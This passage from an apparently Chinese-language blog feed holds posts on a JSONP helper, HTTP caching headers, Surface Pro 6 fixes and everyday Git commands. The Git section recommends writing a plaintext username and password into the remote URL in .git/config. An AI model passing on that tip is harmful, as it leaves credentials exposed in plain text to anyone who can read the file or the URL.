class="property">query</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> query) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">queryString</span> += <span class="string">`&amp;<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;query[key]&#125;</span>`</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>[<span class="variable language_">this</span>.<span class="property">cbName</span>] = <span class="variable language_">this</span>.<span class="property">cb</span></span><br><span class="line">    <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>)</span><br><span class="line">    script.<span class="property">src</span> = <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.url&#125;</span>?callback=<span class="subst">$&#123;<span class="variable language_">this</span>.cbName&#125;</span><span class="subst">$&#123;<span class="variable language_">this</span>.queryString&#125;</span>`</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span><br><span class="line">    script.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(script)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getdata</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> jsonpReq = <span class="keyword">new</span> <span class="title class_">JsonpRequest</span>(</span><br><span class="line">    <span class="string">&quot;http://localhost:3000/jsonp&quot;</span>, </span><br><span class="line">    <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.data&quot;</span>).<span class="property">innerHTML</span> += <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line">  jsonpReq.<span class="title function_">get</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-jsonpReq-方法"><a href="#2-jsonpReq-方法" class="headerlink" title="2. jsonpReq 方法"></a>2. jsonpReq 方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">jsonpReq</span>(<span class="params">options</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> queryString = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> (!options.<span class="property">cbName</span>) &#123;</span><br><span class="line">    options.<span class="property">cbName</span> = <span class="string">&quot;callback&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (options.<span class="property">query</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> options.<span class="property">query</span>) &#123;</span><br><span class="line">      queryString += <span class="string">`&amp;<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;options.query[key]&#125;</span>`</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">window</span>[options.<span class="property">cbName</span>] = options.<span class="property">cb</span></span><br><span class="line">  <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>)</span><br><span class="line">  script.<span class="property">src</span> = <span class="string">`<span class="subst">$&#123;options.url&#125;</span>?callback=<span class="subst">$&#123;options.cbName&#125;</span><span class="subst">$&#123;queryString&#125;</span>`</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script)</span><br><span class="line">  script.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(script)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getdata</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">jsonpReq</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000/jsonp&quot;</span>,</span><br><span class="line">    <span class="attr">query</span>: &#123; <span class="attr">id</span>: <span class="number">1</span> &#125;,</span><br><span class="line">    <span class="attr">cb</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.data&quot;</span>).<span class="property">innerHTML</span> += <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http与浏览器的缓存机制</title>
      <link href="/2019/11/a337085f30b7.html"/>
      <url>/2019/11/a337085f30b7.html</url>
      
        <content type="html"><![CDATA[<h1 id="缓存基础"><a href="#缓存基础" class="headerlink" title="缓存基础"></a>缓存基础</h1><p>首先我们要知道缓存的目的是什么？</p><p>使用缓存可以有效的减少服务器的请求次数，这一特性主要用于缓存静态资源，对于长期不会改变的服务器静态资源，启用缓存则无需从服务器二次下载。</p><p>缓存分为两种类型，分为 <strong>强制缓存</strong> 与 <strong>协商缓存</strong>：</p><p>对于强制缓存，浏览器会根据上次请求获取的 <code>Cache-Controller</code> 或 <code>Expires(http 1.0 规范)</code> 来判断截止当前请求发起时，本地的缓存资源是否过期，如果本地缓存的资源未过期，就会启用本地的缓存而不向服务器建立连接，此时虽然没有建立服务器端的连接，但仍会收到 200 的状态码，但是会被标记为 <code>from cache</code>。</p><p>然而协商缓存是通过上次请求的 <code>Etag</code> 或 <code>Last-Modified</code> 与服务器对比请求资源的信息来判断缓存资源是否过期，如果过期就重新获取资源，没有过期就启用本地的缓存资源而不再向服务器下载该资源，此时会收到 304 的状态码，标记为 <code>not modified</code>。协商缓存要比强缓存流程要多一些，具体过程入下：</p><p><img src="https://i.loli.net/2021/07/20/e1cLN3xQdi6aDh4.png" alt=""></p><p>如果不使用缓存，那么浏览器每发起一个请求就会从服务器重新获取一遍资源，对于大多数服务器来说，是不会启用这一方式的，只有用户使用 <code>ctrl + F5</code> 刷新页面时才会重新请求资源。</p><h1 id="1-Cache-control"><a href="#1-Cache-control" class="headerlink" title="1. Cache-control"></a>1. Cache-control</h1><p>在 Http/1.1 Header 的 <code>Cache-control</code> 字段可以存放缓存相关的信息，以 Express 框架为例，我们可以使用 <code>req.set</code> 来设置 Http Header，从而自定义请求缓存：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/resource&quot;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">set</span>(&#123; <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-store&quot;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">send</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;huahua&quot;</span>, <span class="attr">age</span>: <span class="number">18</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>通常可以进行如下几项设置：</p><h2 id="1-1-禁止缓存"><a href="#1-1-禁止缓存" class="headerlink" title="1.1 禁止缓存"></a>1.1 禁止缓存</h2><p>缓存中不得存储任何关于客户端请求和服务端响应的内容。每次由客户端发起的请求都会下载完整的响应内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: no-store</span><br></pre></td></tr></table></figure><p>启用 no-store 后每次请求状态码都是 200 ，意味着每次请求都是从服务器重新获取的。</p><p><img src="https://i.loli.net/2019/11/27/t8GiJYRX9anbdrC.png" alt=""></p><h2 id="1-2-强制确认缓存"><a href="#1-2-强制确认缓存" class="headerlink" title="1.2 强制确认缓存"></a>1.2 强制确认缓存</h2><p>如下头部定义，此方式下，每次有请求发出时，缓存会将此请求发到服务器（译者注：该请求应该会带有与本地缓存相关的验证字段），服务器端会验证请求中所描述的缓存是否过期，若未过期，服务器会向客户端返回一个 304 状态码表示资源未被转移，客户端可以使用本地缓存。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/27/jicZeKFHkGhCYaJ.png" alt="20191127003501.png"></p><h2 id="1-3-私有缓存和公共缓存"><a href="#1-3-私有缓存和公共缓存" class="headerlink" title="1.3 私有缓存和公共缓存"></a>1.3 私有缓存和公共缓存</h2><p>“public” 指令表示该响应可以被任何中间人（译者注：比如中间代理、CDN等）缓存。若指定了”public”，则一些通常不被中间人缓存的页面（译者注：因为默认是private）（比如 带有HTTP验证信息（帐号密码）的页面 或 某些特定状态码的页面），将会被其缓存。</p><p>而 “private” 则表示该响应是专用于某单个用户的，中间人不能缓存此响应，该响应只能应用于浏览器私有缓存中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: private</span><br><span class="line">Cache-Control: public</span><br></pre></td></tr></table></figure><h2 id="1-4-缓存过期机制"><a href="#1-4-缓存过期机制" class="headerlink" title="1.4 缓存过期机制"></a>1.4 缓存过期机制</h2><p>过期机制中，最重要的指令是 “<code>max-age=&lt;seconds&gt;</code>“，表示资源能够被缓存（保持新鲜）的最大时间。相对<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires">Expires</a>而言，max-age是距离请求发起的时间的秒数。针对应用中那些不会改变的文件，通常可以手动设置一定的时长以保证缓存有效，例如图片、css、js等静态资源。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: max-age=31536000</span><br></pre></td></tr></table></figure><p>启用 <code>max-age</code> 缓存时，浏览器会一直读取本地资源而不向服务器发起请求：</p><p><img src="https://i.loli.net/2019/11/27/VjtNYor2aZ7GwDn.png" alt=""></p><h2 id="1-5-缓存验证确认"><a href="#1-5-缓存验证确认" class="headerlink" title="1.5 缓存验证确认"></a>1.5 缓存验证确认</h2><p>当使用了 “<code>must-revalidate</code>“ 指令，那就意味着缓存在考虑使用一个陈旧的资源时，必须先验证它的状态，已过期的缓存将不被使用。详情看下文关于<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ#Cache_validation">缓存校验</a>的内容。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control: must-revalidate</span><br></pre></td></tr></table></figure><h1 id="2-ETag"><a href="#2-ETag" class="headerlink" title="2. ETag"></a>2. ETag</h1><p>ETag 是在响应头中存放的一个字段，用于校验服务器资源是否过期，从而判断是否启用缓存，对于访问服务器的静态资源来说，ETag 可以表示为静态文件的 Hash。</p><p>如果给定URL中的资源更改，则一定要生成新的 Etag 值。 因此 Etag 类似于指纹，也可能被某些服务器用于跟踪。 比较 Etag 能快速确定此资源是否变化，但也可能被跟踪服务器永久存留。</p><p>ETag 通常用于实现两种功能：</p><ol><li>检测资源是否变更，如未变更，则采用缓存资源</li><li>防止资源请求过程中发生“空中碰撞”</li></ol><h2 id="2-1-检测资源是否变更"><a href="#2-1-检测资源是否变更" class="headerlink" title="2.1 检测资源是否变更"></a>2.1 检测资源是否变更</h2><p>通常用户首次发起请求时，服务器端返回的响应报文的响应头部中会包含 ETag 的信息，如：</p><p><img src="https://i.loli.net/2021/06/21/ScHltx59j6kAXyn.png" alt=""></p><p>这一信息将被客户端所记录，并且在后续的请求中会在请求报文的头部添加一个 <code>if-none-match</code> 的字段，该请求发送到服务器端时，会检测与服务器端 ETag 是否匹配，如果匹配到，说明资源未发生变更，此时会返回 304 状态码，客户端则会读取缓存资源，如：</p><p><img src="https://i.loli.net/2021/06/21/4YDweO9yNboTFQ3.png" alt=""></p><h2 id="2-2-防止-“空中碰撞”"><a href="#2-2-防止-“空中碰撞”" class="headerlink" title="2.2 防止 “空中碰撞”"></a>2.2 防止 “空中碰撞”</h2><p>在<code>ETag</code>和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match"><code>If-Match</code></a> 头部的帮助下，您可以检测到”空中碰撞”的编辑冲突。</p><p>例如，当编辑MDN时，当前的wiki内容被散列，并在响应中放入<code>Etag</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ETag: &quot;33a64df551425fcc55e4d42a148795d9f25f89d4</span><br></pre></td></tr></table></figure><p>将更改保存到Wiki页面（发布数据）时，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/POST"><code>POST</code></a>请求将包含有ETag值的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Match"><code>If-Match</code></a>头来检查是否为最新版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-Match: &quot;33a64df551425fcc55e4d42a148795d9f25f89d4&quot;</span><br></pre></td></tr></table></figure><p>如果哈希值不匹配，则意味着文档已经被编辑，抛出<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/412"><code>412</code></a>前提条件失败错误。</p><h1 id="3-Last-Modify"><a href="#3-Last-Modify" class="headerlink" title="3. Last-Modify"></a>3. Last-Modify</h1><p>The <strong><code>Last-Modified</code></strong>  是一个响应首部，其中包含源头服务器认定的资源做出修改的日期及时间。 它通常被用作一个验证器来判断接收到的或者存储的资源是否彼此一致。由于精确度比  <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag"><code>ETag</code></a> 要低，所以这是一个备用机制。包含有  <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since"><code>If-Modified-Since</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Unmodified-Since"><code>If-Unmodified-Since</code></a> 首部的条件请求会使用这个字段。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Surface Pro 6 日常使用问题记录</title>
      <link href="/2019/11/a3089ef6c32b.html"/>
      <url>/2019/11/a3089ef6c32b.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-屏幕低亮度闪屏问题"><a href="#1-屏幕低亮度闪屏问题" class="headerlink" title="1. 屏幕低亮度闪屏问题"></a>1. 屏幕低亮度闪屏问题</h1><p>按以下顺序找到0000文件夹：</p><p><code>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\&#123;4d36e968-e325-11ce-bfc1-08002be10318&#125;\0000]</code></p><p>然后找FeatureTestControl注册表修改数值数据9250</p><h1 id="2-CPU-锁频-0-4-Ghz"><a href="#2-CPU-锁频-0-4-Ghz" class="headerlink" title="2. CPU 锁频 0.4 Ghz"></a>2. CPU 锁频 0.4 Ghz</h1><p>开机后按住电源 15s <strong>强制关机</strong>，关机后按住电量上键，再点按一下开机键，等待进入 UEFI 界面，点击重启设备。原理是这样可以清除硬件缓存。</p><h1 id="3-蓝牙鼠标卡顿"><a href="#3-蓝牙鼠标卡顿" class="headerlink" title="3. 蓝牙鼠标卡顿"></a>3. 蓝牙鼠标卡顿</h1><p>暂时无解</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git常用操作整理</title>
      <link href="/2019/11/9db24a5efd7e.html"/>
      <url>/2019/11/9db24a5efd7e.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Git-基本原理"><a href="#1-Git-基本原理" class="headerlink" title="1. Git 基本原理"></a>1. Git 基本原理</h1><ul><li>工作区：我们能看到的，用来写代码的区域</li><li>暂存区：临时存储用的</li><li>历史区：生成历史版本</li></ul><p><img src="http://img.cdn.esunr.xyz/markdown/20191118231730.png" alt="Git基本工作流程"></p><h1 id="2-基础指令"><a href="#2-基础指令" class="headerlink" title="2. 基础指令"></a>2. 基础指令</h1><h2 id="Git-配置"><a href="#Git-配置" class="headerlink" title="Git 配置"></a>Git 配置</h2><p>查看配置信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config -l           <span class="comment"># 查看配置信息</span></span><br><span class="line">git config --global -l  <span class="comment"># 查看全局配置</span></span><br><span class="line">git config --<span class="built_in">local</span>  -l  <span class="comment"># 查看当前项目配置</span></span><br></pre></td></tr></table></figure><p>设置配置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&#x27;username&#x27;</span></span><br><span class="line">git config --global user.email <span class="string">&#x27;email&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="提交到暂存区"><a href="#提交到暂存区" class="headerlink" title="提交到暂存区"></a>提交到暂存区</h2><p>在本地编写完成代码后，把一些内容提交到暂存区</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add xxx   <span class="comment"># 把某个文件提交到暂存区</span></span><br><span class="line">git add .     <span class="comment"># 把当前仓库中的所有最新修改的文件都提交到暂存区</span></span><br><span class="line">git add -A    <span class="comment"># 同上</span></span><br></pre></td></tr></table></figure><h2 id="查看当前文件状态"><a href="#查看当前文件状态" class="headerlink" title="查看当前文件状态"></a>查看当前文件状态</h2><p>红色代表在工作区，绿色代表在暂存区，看不见东西证明所有修改信息都已提交到历史区</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status </span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20191118233413.png" alt="演示示例"></p><h2 id="提交到历史区"><a href="#提交到历史区" class="headerlink" title="提交到历史区"></a>提交到历史区</h2><p>只能将暂存区中的代码提交到历史区：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m <span class="string">&#x27;描述信息&#x27;</span></span><br></pre></td></tr></table></figure><p>查看历史信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git log         # 查看历史版本信息</span><br><span class="line">git reflog      # 查看包含回滚信息的历史版本信息</span><br><span class="line">git log --graph # 以时间线的形式查看分支信息</span><br></pre></td></tr></table></figure><p>从工作区提交到暂存区、从暂存区提交到历史区都是把内容复制一份传过去，文本域中仍存在这些信息。</p><blockquote><p>在 vscode 中，更改后的代码在提交时可以自动进行暂存操作（add），无需再手动暂存。</p></blockquote><h1 id="3-远程仓库"><a href="#3-远程仓库" class="headerlink" title="3. 远程仓库"></a>3. 远程仓库</h1><h2 id="远程源"><a href="#远程源" class="headerlink" title="远程源"></a>远程源</h2><p>查看当前仓库远程源：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure><p>添加/删除远程源:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin <span class="string">&#x27;Git Origin&#x27;</span>   </span><br><span class="line">git remote remove origin <span class="string">&#x27;Git Origin&#x27;</span>   </span><br></pre></td></tr></table></figure><h2 id="拉取提交到远程源"><a href="#拉取提交到远程源" class="headerlink" title="拉取提交到远程源"></a>拉取提交到远程源</h2><p>拉取远程源：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull origin master</span><br></pre></td></tr></table></figure><p>提交远程源：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure><h2 id="Clone"><a href="#Clone" class="headerlink" title="Clone"></a>Clone</h2><p>Clone 可以简化拉取远程项目的步骤，与 <code>add remote origin</code> 并 <code>git pull</code> 不同的是，Clone 拉取的是整个项目的所有分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> <span class="string">&#x27;Git Origin&#x27;</span> </span><br></pre></td></tr></table></figure><h2 id="https-免密码同步"><a href="#https-免密码同步" class="headerlink" title="https 免密码同步"></a>https 免密码同步</h2><p>在添加 git remote 地址的时候，如果使用的是 https，则需要每次提交同步代码的时候都输入用户名与密码，为了免去用户名与密码的输入我们可以修改 <code>.git/config</code> 文件下的配置，添加用户名与密码：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## config</span><br><span class="line"></span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line"><span class="deletion">-      url = https://github.com/UserName/YourProject.git</span></span><br><span class="line"><span class="addition">+      url = https://username:password@github.com/UserName/YourProject.git</span></span><br></pre></td></tr></table></figure><h1 id="4-内容处理"><a href="#4-内容处理" class="headerlink" title="4. 内容处理"></a>4. 内容处理</h1><h2 id="丢弃更改"><a href="#丢弃更改" class="headerlink" title="丢弃更改"></a>丢弃更改</h2><p>当文件进行变更后，且尚未进入暂存区时，使用 <code>chekcout --</code> 指令可以丢弃已有的更改</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- &lt;file&gt;</span><br></pre></td></tr></table></figure><h2 id="撤销暂存"><a href="#撤销暂存" class="headerlink" title="撤销暂存"></a>撤销暂存</h2><p>当更改过的文件被提交到暂存区后，可以重新撤回到工作区</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD &lt;file&gt;</span><br></pre></td></tr></table></figure><h2 id="文件修改"><a href="#文件修改" class="headerlink" title="文件修改"></a>文件修改</h2><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>删除一个被 git 追踪的文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">rm</span> &lt;file&gt;</span><br></pre></td></tr></table></figure><p>与使用系统指令直接删除不同的是，文件删除之后会出现在暂存区，可以从暂存区中撤销到工作区，也可以再从工作区撤销更改，文件就会被恢复。</p><h3 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">mv</span> &lt;file name&gt; &lt;new file name&gt;</span><br></pre></td></tr></table></figure><p>此时文件会被存放到暂存区，显示为对文件进行了一个 R（rename） 操作</p><h2 id="修改已提交的信息"><a href="#修改已提交的信息" class="headerlink" title="修改已提交的信息"></a>修改已提交的信息</h2><p>当用户写错了一个提交信息并向修正信息时可以使用以下指令修正信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit --amend -m <span class="string">&#x27;纠正过的提交信息&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>amend: 修正</p></blockquote><h2 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h2><ul><li><code>*.a</code> 忽略所有 .a 结尾的文件</li><li><code>!lib.a</code> 在上述的忽略规则中 lib.a 除外</li><li><code>/TODO</code> 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODO</li><li><code>build/</code> 忽略 build/ 目录下的所有文件</li><li><code>doc/*.txt</code> 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt</li></ul><h1 id="5-分支"><a href="#5-分支" class="headerlink" title="5. 分支"></a>5. 分支</h1><h2 id="分支查看"><a href="#分支查看" class="headerlink" title="分支查看"></a>分支查看</h2><p>查看当前版本库的所有分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20191210112942.png" alt=""></p><p>查看本地分支以及远程分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -a</span><br></pre></td></tr></table></figure><p>查看各分支最近一次提交的记录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -v</span><br></pre></td></tr></table></figure><h2 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git branch &lt;branch name&gt;</span><br><span class="line">git checkout -b &lt;branch name&gt; <span class="comment"># 创建并切换到新分支</span></span><br></pre></td></tr></table></figure><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><p>git 分支的切换也用的是 <code>checkout</code> 指令，这与文件的签出要进行区别，文件的签出是将文件从工作区撤销更改，而分支的签出是改变分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout &lt;branch name&gt;</span><br><span class="line">git checkout - <span class="comment"># 切换到上一个分支</span></span><br></pre></td></tr></table></figure><h2 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h2><p>git 不可以删除当前分支，删除分支前需要切换到别的分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d &lt;branch name&gt;</span><br></pre></td></tr></table></figure><p>如果删除的目标分支被改动且没有被合并过，则分支需要使用强制删除：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -D &lt;branch name&gt;</span><br></pre></td></tr></table></figure><p>删除远程分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin --delete &lt;branch name&gt;</span><br></pre></td></tr></table></figure><p>删除当前分支外的所有分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch | xargs git branch -d</span><br></pre></td></tr></table></figure><p>删除分支名包含指定字符的分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch | grep <span class="string">&#x27;dev*&#x27;</span> | xargs git branch -d</span><br></pre></td></tr></table></figure><p>删除远程不存在的分支：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote prune origin</span><br></pre></td></tr></table></figure><h2 id="分支合并"><a href="#分支合并" class="headerlink" title="分支合并"></a>分支合并</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git merge &lt;target branch&gt; &lt;branch&gt;  <span class="comment"># 将 branch 的最新修改合并到 target branch 中</span></span><br><span class="line">git merge &lt;branch&gt;                  <span class="comment"># 将 branch 的最新修改合并到当前分支</span></span><br></pre></td></tr></table></figure><p>如果将某一个分支（branch）的最新修改合并到目标分支（target branch）上，那么目标分支（target branch）的文件会处于修改的最新版本，而合并的分支（branch）并不会拥有目标分支（target branch）的新内容。如果需要目标分支（target branch）的新内容，则需要将目标分支合并到该分支上。</p><h2 id="HEAD-与-master"><a href="#HEAD-与-master" class="headerlink" title="HEAD 